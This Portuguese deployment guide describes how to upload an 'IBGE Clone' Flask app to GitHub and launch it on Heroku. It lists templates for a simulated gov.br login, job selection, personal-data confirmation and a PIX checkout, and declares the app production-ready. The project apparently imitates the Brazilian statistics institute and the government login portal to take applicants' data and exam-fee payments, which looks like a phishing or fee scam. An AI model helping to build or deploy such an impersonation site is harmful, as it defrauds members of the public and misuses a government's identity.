# IBGE Clone - Arquivos para GitHub Upload

## Instruções para Upload Manual no GitHub

Como o Git local está corrompido, aqui estão os arquivos que devem ser carregados manualmente no repositório:
https://github.com/Solutionsforce/IbgeClone

## Arquivos Principais da Aplicação

### Configuração Heroku (OBRIGATÓRIOS)
- `Procfile` - Configuração do servidor Gunicorn
- `runtime.txt` - Versão Python 3.11.10
- `app.json` - Deploy automático Heroku com PostgreSQL
- `requirements-heroku.txt` - Dependências Python limpas
- `.gitignore` - Exclusões de arquivos
- `README.md` - Documentação completa com botão deploy

### Arquivos Python Principais
- `app.py` - Configuração Flask principal
- `main.py` - Ponto de entrada da aplicação
- `routes.py` - Todas as rotas e APIs (PIX, escolas, etc)
- `models.py` - Modelos do banco PostgreSQL
- `for4_payments.py` - Integração PIX For4Payments
- `escola_utils.py` - Sistema de busca de escolas por CEP

### Templates HTML (pasta templates/)
- `base.html` - Template base com layout governo
- `index.html` - Página principal IBGE
- `login.html` - Login gov.br simulado
- `selecao_cargo.html` - Seleção de cargo
- `confirmacao_dados.html` - Confirmação dados (com data/hora Brasília)
- `selecao_local_prova.html` - Seleção escola por CEP
- `checkout.html` - Checkout PIX com dados transmitidos
- `edital_completo.html` - Edital completo
- `concursos.html`, `processos_seletivos.html`, `estagios.html`

### Arquivos Estáticos (pasta static/)
#### CSS
- `static/css/style.css` - Estilos customizados

#### JavaScript
- `static/js/main.js` - Funcionalidades JavaScript principais

#### Imagens
- `static/images/` - Logos IBGE, ícones do sistema

### Dados
- `escolas_brasil.csv` - Base de 62+ escolas reais brasileiras
- `attached_assets/escolas_1751255295856.csv` - Backup escolas

### Scripts de Deploy
- `deploy-heroku.sh` - Script automatizado de deploy
- `heroku-requirements.txt` - Dependências alternativas

## NÃO Incluir no GitHub

### Arquivos Replit (excluir)
- `.replit` - Configuração Replit
- `replit.nix` - Configuração Nix
- `uv.lock` - Lock file UV
- `pyproject.toml` - Configuração UV/Poetry
- `replit.md` - Documentação específica Replit

### Arquivos de Cache
- `__pycache__/` - Cache Python
- `*.pyc` - Bytecode Python
- `.pythonlibs/` - Bibliotecas Python locais

## Passos para Upload Manual

1. **Acesse:** https://github.com/Solutionsforce/IbgeClone
2. **Delete tudo** no repositório atual (se houver conflitos)
3. **Upload os arquivos** listados acima mantendo a estrutura:
   ```
   /
   ├── Procfile
   ├── runtime.txt
   ├── app.json
   ├── README.md
   ├── requirements-heroku.txt
   ├── .gitignore
   ├── app.py
   ├── main.py
   ├── routes.py
   ├── models.py
   ├── for4_payments.py
   ├── escola_utils.py
   ├── escolas_brasil.csv
   ├── deploy-heroku.sh
   ├── templates/
   │   ├── base.html
   │   ├── index.html
   │   ├── checkout.html
   │   └── ... (todos os .html)
   └── static/
       ├── css/style.css
       ├── js/main.js
       └── images/
   ```

4. **Commit message:** "Deploy preparation: Complete Heroku configuration with PIX integration"

## Teste do Deploy

Após upload no GitHub, teste o deploy:

1. **Deploy automático:** Use botão "Deploy to Heroku" no README
2. **Configure:** Adicione `FOR4PAYMENTS_SECRET_KEY` nas variáveis
3. **Teste:** Acesse a URL gerada e teste o fluxo completo

## Status Atual

✅ Sistema funcionando 100%
✅ API PIX For4Payments ativa (HTTP 200)
✅ Dados transmitindo corretamente
✅ Data/hora Brasília dinâmica
✅ Sistema de escolas com dados reais
✅ Responsivo mobile
✅ Pronto para produção Heroku